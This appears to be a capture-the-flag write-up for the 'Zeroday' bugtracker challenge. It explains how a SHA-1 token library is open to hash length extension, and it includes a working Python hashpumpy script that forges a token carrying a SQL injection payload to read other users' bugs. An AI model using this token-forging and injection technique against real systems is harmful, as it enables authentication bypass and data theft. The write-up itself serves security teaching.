# Zeroday

## Challenge Description
Found too many zerodays to keep count of them? Zeroday is your new bugtracker.

Beta version access available only for our partners. Stay tuned for open access.

## Initial Analysis
The challenge provides a web application that serves as a bugtracker called "Zeroday". It allows users to log in and view their reported bugs.

Upon analyzing the provided `app.js` code, we notice the following:
- The application uses Express.js as the web framework and SQLite as the database.
- User authentication is implemented using a custom library called `smoltok` for token-based authentication.
- The `smoltok` library is used to encode and decode user tokens, which are stored as cookies.
- The application retrieves the user's bugs from the database based on the authenticated user's username.

Further investigation reveals that the `smoltok` library used in the application is intentionally vulnerable. It uses SHA-1 for token signature generation and verification, which is known to be susceptible to hash extension attacks.

## Vulnerability
The vulnerability in this challenge lies in the use of the `smoltok` library for token-based authentication. The library uses SHA-1 to generate and verify token signatures, which is vulnerable to hash extension attacks.

By exploiting this vulnerability, an attacker can manipulate the token to bypass authentication and perform SQL injection to retrieve bugs belonging to other users, including the admin user.

## Exploitation
To exploit this vulnerability and retrieve the flag, we can use a tool like `hashpump` or a library like `hashpumpy` to perform a hash extension attack on the token.

Here's an example exploitation using `hashpumpy`:

```python
import requests
import hashpumpy
import base64

def pad_base64(base64_string):
    pad_length = (4 - (len(base64_string) % 4)) % 4
    return base64_string + "=" * pad_length

# Original token obtained from the application
original_token = "dXNlcm5hbWU9YWRhbQ.k00XTCj1253CrzegGnm91y/xvjc"

token_data = pad_base64(original_token.split(".")[0]) # cause smoltok removed padding
token_signature = pad_base64(original_token.split(".")[1]) # cause smoltok removed padding

data_bytes = base64.b64decode(token_data)
signature_bytes = base64.b64decode(token_signature)

signature_hex = signature_bytes.hex()

original_data = data_bytes
appended_data = b"' or '1' = '1" # sql injection here, return not only adam's bugs
original_hash = signature_hex
secret_length = 128 # signature lenght is known

result = hashpumpy.hashpump(original_hash, original_data, appended_data, secret_length) # extension attack
new_hash, new_data = result

new_token_data = base64.b64encode(new_data)
new_token_signature = base64.b64encode(bytes.fromhex(new_hash))

# construct new token
new_token = new_token_data.decode().replace("=", "") + "." + new_token_signature.decode().replace("=", "") 

print(new_token)
```

1. Obtain a valid token from the application by logging in as a normal user (you can find credentials for `adam` in the code).
1. Split the token into the data and signature parts.
1. Use `hashpumpy` to perform a hash extension attack on the token, appending a SQL injection payload to the data part.
1. Construct a new token with the modified data and the new signature.
1. Replace old token with a new token in your browser to get the flag.

Flag: `1753c{well_youve_just_found_a_zero_day_on_npm}`

## Conclusion

The "Zeroday" challenge demonstrates the risks associated with using vulnerable libraries and the importance of secure token-based authentication mechanisms. The use of the intentionally vulnerable `smoltok` library, which relies on SHA-1 for token signature generation and verification, allows attackers to perform hash extension attacks and bypass authentication.

By exploiting this vulnerability, an attacker can manipulate the token to perform SQL injection and retrieve sensitive information, such as bugs belonging to other users, including the admin user.

This challenge highlights the need for thorough security assessments of third-party libraries and the importance of using secure cryptographic algorithms for authentication and signature generation. It also emphasizes the significance of input validation and parameterized queries to prevent SQL injection attacks.

By leveraging tools like `hashpump` or libraries like `hashpumpy`, participants can exploit the vulnerability in the `smoltok` library and retrieve the flag from the admin user's bugs.
